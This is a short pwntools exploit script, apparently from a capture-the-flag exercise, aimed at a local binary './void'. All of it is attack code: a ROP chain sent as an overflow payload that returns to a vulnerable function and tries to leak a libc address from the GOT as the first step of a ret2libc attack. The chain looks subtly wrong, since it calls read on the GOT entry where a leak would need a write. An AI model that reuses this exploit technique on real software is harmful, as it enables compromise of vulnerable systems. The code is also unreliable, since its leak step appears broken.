from pwn import *

context.log_level = "Error"
elf = ELF("./void")
pros = process("./void")
rop = ROP(elf)

rop.read(1, elf.got["__libc_start_main"], 8)
rop.call(elf.symbols["vuln"])

payload = flat({12: rop.chain()})  # Adjust the offset if necessary

pros.sendline(payload)

libc_start_main_leak = u64(pros.recv(8).strip().ljust(8, b"\x00"))
log.info(f"Leaked __libc_start_main address: {hex(libc_start_main_leak)}")
